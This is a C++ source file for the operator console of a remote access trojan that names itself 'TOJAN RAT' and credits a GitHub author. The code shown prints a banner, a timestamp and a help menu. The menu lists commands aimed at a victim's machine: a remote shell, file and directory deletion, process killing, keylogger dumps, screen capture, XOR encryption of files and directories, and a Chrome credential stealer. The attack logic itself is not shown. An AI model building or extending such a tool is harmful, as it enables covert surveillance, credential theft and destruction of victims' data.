#include <iostream>
#include <ctime>
#include "Menu.h"
#include "Config.h"


#include <windows.h>
#pragma warning(disable: 4996)
HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);


void PrintGreeting() {

	SetConsoleTextAttribute(hConsole, 13);
	std::cout << "TOJAN RAT ";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "0.0.4 ";
	SetConsoleTextAttribute(hConsole, 13);
	std::cout << "by HUGOW04              \n";
	SetConsoleTextAttribute(hConsole, 10);		
	std::cout << "github:";
	SetConsoleTextAttribute(hConsole, 13);
	std::cout << " https://github.com/HUGOW04   \n";
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << "\n";
	std::cout << "\n";
}

void HelpMenu() {

	std::cout << "\t\t     HELP [";
	SetConsoleTextAttribute(hConsole, 12);
	std::cout << "MENU";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "]\n";
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << "\ncommands:\n";
	SetConsoleTextAttribute(hConsole, 7);

	std::cout
		<< "--------------------------------------------------------\n"
		<< "|1 | [help]         - print help menu                  |\n"
		<< "|2 | [close]        - close connection                 |\n"
		<< "|3 | [pwd]          - path                             |\n"
		<< "|4 | [cmd]          - cmd                              |\n"
		<< "|5 | [ls]           - list files and dirs              |\n"
		<< "|6 | [rm]           - delete file                      |\n"
		<< "|7 | [rmdir]        - delete directory                 |\n"
		<< "|8 | [info]         - information (os, cpu, gpu, etc)  |\n"
		<< "|9 | [ps]           - process info                     |\n"
		<< "|10| [kill]         - kill process                     |\n"
		<< "|11| [keydump]      - dump logs of keylogger           |\n"
		<< "|12| [download]     - download file                    |\n"
		<< "|13| [error]        - print error (english only)       |\n"
		<< "|14| [screencap]    - screenshot the victim's computer |\n"
		<< "|15| [cryptfile]    - encrypt file      with using XOR |\n"
		<< "|16| [cryptdir]     - encrypt directory with using XOR |\n"
		<< "|17| [chrome_st]    - chrome stealer                   |\n"
		<< "--------------------------------------------------------\n" << std::endl;
}

// print timer in format: [hh:mm:ss]
void timenow() {
	char time_buf[80];
	time_t seconds = time(NULL);
	tm* timeinfo = localtime(&seconds);
	const char* format = "%H:%M:%S";
	strftime(time_buf, 80, format, timeinfo);
	std::cout << "[";
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << time_buf;
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "]";

}

